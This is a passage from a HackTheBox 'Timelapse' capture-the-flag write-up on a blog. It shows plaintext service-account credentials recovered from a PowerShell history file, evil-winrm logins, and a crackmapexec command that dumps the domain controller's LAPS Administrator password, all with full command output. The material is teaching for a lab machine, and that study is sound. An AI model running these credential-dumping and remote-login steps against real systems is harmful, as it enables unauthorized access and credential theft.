+</span></span><span class="line"><span class="cl">    C:\Users\legacyy\NTUSER.DAT
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Reading the <code>ConsoleHost_history.txt</code> file.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">ipconfig /all
+</span></span><span class="line"><span class="cl">netstat -ano |select-string LIST
+</span></span><span class="line"><span class="cl">$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+</span></span><span class="line"><span class="cl">$p = ConvertTo-SecureString &#39;E3R$Q62^12p7PLlC%KWaxuaV&#39; -AsPlainText -Force
+</span></span><span class="line"><span class="cl">$c = New-Object System.Management.Automation.PSCredential (&#39;svc_deploy&#39;, $p)
+</span></span><span class="line"><span class="cl">invoke-command -computername localhost -credential $c -port 5986 -usessl -
+</span></span><span class="line"><span class="cl">SessionOption $so -scriptblock {whoami}
+</span></span><span class="line"><span class="cl">get-aduser -filter * -properties *
+</span></span><span class="line"><span class="cl">exit
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We got credentials of another user <code>svc_deploy</code>.</p>
+<p>Logging into <code>svc_deploy</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup]
+</span></span><span class="line"><span class="cl">└─$ evil-winrm -S -i 10.10.11.152 -u svc_deploy -p &#39;E3R$Q62^12p7PLlC%KWaxuaV&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.3
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; whoami
+</span></span><span class="line"><span class="cl">timelapse\svc_deploy
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; whoami /all
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">USER INFORMATION
+</span></span><span class="line"><span class="cl">----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User Name            SID
+</span></span><span class="line"><span class="cl">==================== ============================================
+</span></span><span class="line"><span class="cl">timelapse\svc_deploy S-1-5-21-671920749-559770252-3318990721-3103
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">GROUP INFORMATION
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Group Name                                  Type             SID                                          Attributes
+</span></span><span class="line"><span class="cl">=========================================== ================ ============================================ ==================================================
+</span></span><span class="line"><span class="cl">Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PRIVILEGES INFORMATION
+</span></span><span class="line"><span class="cl">----------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Privilege Name                Description                    State
+</span></span><span class="line"><span class="cl">============================= ============================== =======
+</span></span><span class="line"><span class="cl">SeMachineAccountPrivilege     Add workstations to domain     Enabled
+</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">USER CLAIMS INFORMATION
+</span></span><span class="line"><span class="cl">-----------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User claims unknown.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Kerberos support for Dynamic Access Control on this device has been disabled.
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Notice that this user is part of <code>TIMELAPSE\LAPS_Readers</code> group.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Looking for privilege escalation using LAPS.</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>LAPS<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">LAPS simplifies password management while helping customers implement recommended defenses against cyberattacks. In particular, the solution mitigates the risk of lateral escalation that results when customers use the same administrative local account and password combination on their computers. LAPS stores the password for each computer’s local administrator account in Active Directory, secured in a confidential attribute in the computer’s corresponding Active Directory object.</div>
+        </div>
+    </div>
+<p>Source: <a href="https://www.hackingarticles.in/credential-dumpinglaps/" target="_blank" rel="noopener noreffer ">https://www.hackingarticles.in/credential-dumpinglaps/</a></p>
+<p>Looking further on the same <a href="https://www.hackingarticles.in/credential-dumpinglaps/" target="_blank" rel="noopener noreffer ">article</a>, there are a bunch of methods to dump <code>Administrator</code> password.</p>
+<p>I used <code>crackmapexec</code> to dump the <code>Administrator</code> password.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>saad㉿ssaadakhtarr<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/machines/timelapse/writeup<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ crackmapexec ldap 10.10.11.152 -u svc_deploy -p <span class="s1">&#39;E3R$Q62^12p7PLlC%KWaxuaV&#39;</span> –kdcHost 10.10.11.152 -M laps
+</span></span><span class="line"><span class="cl">SMB         10.10.11.152    <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:timelapse.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.152    <span class="m">389</span>    DC01             <span class="o">[</span>+<span class="o">]</span> timelapse.htb<span class="se">\s</span>vc_deploy:E3R<span class="nv">$Q62</span>^12p7PLlC%KWaxuaV 
+</span></span><span class="line"><span class="cl">LAPS        10.10.11.152    <span class="m">389</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Getting LAPS Passwords
+</span></span><span class="line"><span class="cl">LAPS        10.10.11.152    <span class="m">389</span>    DC01             Computer: DC01$                Password: 8qRr<span class="o">)</span>lFd9+fHLk47l<span class="o">(</span>N.v%tj
+</span></span><span class="line"><span class="cl">                                                                    
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now login to <code>Administrator</code> using <code>evil-winrm</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(saad㉿ssaadakhtarr)-[~/…/hackthebox/machines/timelapse/writeup]
+</span></span><span class="line"><span class="cl">└─$ evil-winrm -S -i 10.10.11.152 -u Administrator -p &#39;8qRr)lFd9+fHLk47l(N.v%tj&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.3
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+</span></span><span class="line"><span class="cl">timelapse\administrator
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="roottxt">root.txt</h2>
+<p>Usually the <code>root.txt</code> is located at <code>C:\Users\Administrator\Desktop\</code> for windows machines but for this machine it is located at <code>C:\Users\TRX\Desktop</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; Get-ChildItem -Path C:\ -Filter root.txt -Recurse -ErrorAction SilentlyContinue -Force
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:\Users\TRX\Desktop
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
+</span></span><span class="line"><span class="cl">----                -------------         ------ ----
+</span></span><span class="line"><span class="cl">-ar---        8/18/2022   8:29 AM             34 root.txt
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat C:\Users\TRX\Desktop\root.txt
+</span></span><span class="line"><span class="cl">e******************************4
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Thanks for reading!</strong></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-08-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/hackthebox-timelapse/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/hackthebox-timelapse/" data-title="HackTheBox - Timelapse" data-via="ssaadakhtarr" data-hashtags="hackthebox,machines"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="/hackthebox-timelapse/" data-hashtag="hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="/hackthebox-timelapse/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/hackthebox/">hackthebox</a>,&nbsp;<a href="/tags/machines/">machines</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/pwnable.kr-toddlers-bottle-coin1/" class="prev" rel="prev" title="Pwnable.kr - Toddler&#39;s Battle - [coin1]"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Pwnable.kr - Toddler's Battle - [coin1]</a>
+            <a href="/hackthebox-opensource/" class="next" rel="next" title="HackTheBox - OpenSource">HackTheBox - OpenSource<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.105.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Saad Akhtar</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
